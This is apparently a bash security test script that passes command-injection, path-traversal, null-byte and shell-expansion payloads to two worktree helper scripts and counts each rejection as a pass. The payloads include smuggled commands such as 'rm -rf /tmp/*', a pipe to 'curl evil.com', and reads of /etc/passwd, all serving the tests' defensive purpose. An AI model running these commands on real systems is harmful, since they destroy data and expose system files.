#!/bin/bash
set -euo pipefail

# Security tests for command injection attack prevention
# Usage: ./test_injection_attacks.sh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
WORKTREE_CREATE="$PROJECT_ROOT/scripts/worktree/worktree-create.sh"
WORKTREE_CLEANUP="$PROJECT_ROOT/scripts/worktree/worktree-cleanup.sh"

# Test framework
TESTS_PASSED=0
TESTS_FAILED=0

test_injection_attack() {
    local description="$1"
    local attack_payload="$2"
    local script="$3"
    
    echo "Testing: $description"
    
    # Run script with malicious input - should fail gracefully
    if timeout 10s "$script" "$attack_payload" 2>/dev/null >/dev/null; then
        echo "❌ FAIL: $description - Attack payload succeeded (security vulnerability!)"
        ((TESTS_FAILED++))
    else
        echo "✅ PASS: $description - Attack payload properly rejected"
        ((TESTS_PASSED++))
    fi
}

echo "Running command injection attack tests..."
echo "========================================"

# Test command injection attacks on branch names
echo
echo "Testing branch name injection attacks..."

test_injection_attack "Command injection via semicolon" "branch; rm -f /tmp/injection-test" "$WORKTREE_CREATE"
test_injection_attack "Command injection via pipe" "branch | curl evil.com" "$WORKTREE_CREATE"
test_injection_attack "Command injection via backticks" "branch\`id\`" "$WORKTREE_CREATE"
test_injection_attack "Command injection via dollar" "branch\$(whoami)" "$WORKTREE_CREATE"
test_injection_attack "Command injection via ampersand" "branch && echo pwned" "$WORKTREE_CREATE"

# Test path traversal attacks  
echo
echo "Testing path traversal attacks..."

test_injection_attack "Path traversal basic" "../../../etc/passwd" "$WORKTREE_CREATE"
test_injection_attack "Path traversal URL encoded" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "$WORKTREE_CREATE"
test_injection_attack "Path traversal mixed" "branch/../../../tmp/evil" "$WORKTREE_CREATE"

# Test null byte injection
echo
echo "Testing null byte injection attacks..."

test_injection_attack "Null byte injection" "branch\x00.sh" "$WORKTREE_CREATE"
test_injection_attack "Null byte with command" "branch\x00; echo pwned" "$WORKTREE_CREATE"

# Test cleanup script injection attacks
echo
echo "Testing cleanup script injection attacks..."

# Create a temporary safe worktree for cleanup testing
SAFE_TEST_DIR="/tmp/worktree-injection-test-$$"
mkdir -p "$SAFE_TEST_DIR"

test_injection_attack "Cleanup injection via path" "$SAFE_TEST_DIR; rm -rf /tmp/*" "$WORKTREE_CLEANUP"
test_injection_attack "Cleanup injection via backticks" "$SAFE_TEST_DIR\`id > /tmp/pwned\`" "$WORKTREE_CLEANUP" 

# Cleanup
rm -rf "$SAFE_TEST_DIR"

# Test special shell characters
echo
echo "Testing special shell character handling..."

test_injection_attack "Shell glob expansion" "branch*" "$WORKTREE_CREATE"
test_injection_attack "Shell brace expansion" "branch{a,b}" "$WORKTREE_CREATE"
test_injection_attack "Shell tilde expansion" "branch~/evil" "$WORKTREE_CREATE"

echo
echo "Security Test Summary"
echo "===================="
echo "Tests passed: $TESTS_PASSED"
echo "Tests failed: $TESTS_FAILED"
echo "Total tests: $((TESTS_PASSED + TESTS_FAILED))"

if [[ $TESTS_FAILED -eq 0 ]]; then
    echo "✅ All security tests passed! No injection vulnerabilities detected."
    exit 0
else
    echo "❌ CRITICAL: Security vulnerabilities detected!"
    echo "   $TESTS_FAILED attack payloads succeeded when they should have been blocked."
    echo "   This indicates potential command injection vulnerabilities."
    exit 1
fi